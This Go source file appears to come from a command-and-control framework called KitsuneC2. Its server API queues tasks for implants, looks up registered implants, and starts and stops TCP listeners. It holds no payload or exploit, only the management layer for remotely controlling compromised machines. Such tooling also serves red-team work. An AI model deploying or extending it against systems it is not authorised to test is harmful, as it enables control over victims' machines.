package api

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/lib/cryptography"
	"KitsuneC2/server/db"
	"KitsuneC2/server/handlers"
	"KitsuneC2/server/listener"
	"encoding/json"
	"errors"
	"log"
	"math/rand"
	"reflect"
	"strconv"
	"time"
)

var runningsListeners []listener.Listener

// Adds a task to be executed for a specific implant. The taskArguments parameter should be a serializable type, see /lib/serializable
// to see the types of requests a server can make to the implant.
func AddTaskForImplant(implantId string, taskType int, taskArguments *communication.Task) error {
	//use reflection to check that taskType and taskArguments correspond
	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[taskType]())
	actualType := reflect.TypeOf(*taskArguments).Elem()
	if !actualType.AssignableTo(expectedType) && !reflect.PointerTo(actualType).AssignableTo(expectedType) {
		return errors.New("taskType and taskArguments don't correspond")
	}
	rand.Uint32()
	id := cryptography.GenerateMd5FromStrings(implantId, strconv.FormatInt(time.Now().UnixNano(), 10))
	(*taskArguments).SetTaskId(id) //Set the taskId of the arguments.

	//Marshal the taskArguments so that the object can be stored in the database
	marshalledTaskData, err := json.Marshal(taskArguments)
	if err != nil {
		return err
	}
	var task *db.Implant_task = new(db.Implant_task)
	task.Implant_id = implantId
	task.Task_type = taskType
	task.Task_data = marshalledTaskData
	task.Completed = false
	task.Task_id = id

	err = db.AddTask(task)
	if err != nil {
		return err
	}
	return nil
}

// checks if implant with implantId exists in our database
func ImplantExists(implantId string) bool {
	_, err := db.GetImplantInfo(implantId)
	if err != nil {
		if err == db.ErrNoResults {
			return false
		} else {
			log.Printf("[ERROR] encountered error while checking for existance of implant with ID: %s. Reason: %s ", implantId, err.Error())
		}
	}
	return true
}

// returns information about all implants registered in the DB.
func GetAllImplants() ([]*db.Implant_info, error) {
	return db.GetAllImplants()
}

// Starts a TCP listener on the specified port and network. E.g. network="127.0.0.1" port=4444. Leave network empty to listen
// on all available interfaces.
func AddListener(network string, port int) error {
	var ls listener.Listener = listener.Listener{Type: "tcp", Handler: handlers.TcpHandler, Network: network, Port: port}
	err := ls.Start()
	if err != nil {
		return err
	}

	runningsListeners = append(runningsListeners, ls)
	return nil
}

// Returns a list of all running jobs
func GetRunningListeners() (*[]listener.Listener, error) {
	if len(runningsListeners) == 0 {
		return nil, errors.New("no listeners running")
	}
	return &runningsListeners, nil
}

// Kills job with given ID.
func KillListener(listenerId int) error {
	if listenerId < 0 || listenerId >= len(runningsListeners) {
		return errors.New("no listener with that ID")
	}
	runningsListeners[listenerId].Stop()
	runningsListeners = append(runningsListeners[:listenerId], runningsListeners[listenerId+1:]...) //removes element from list and shifts other elements
	return nil
}
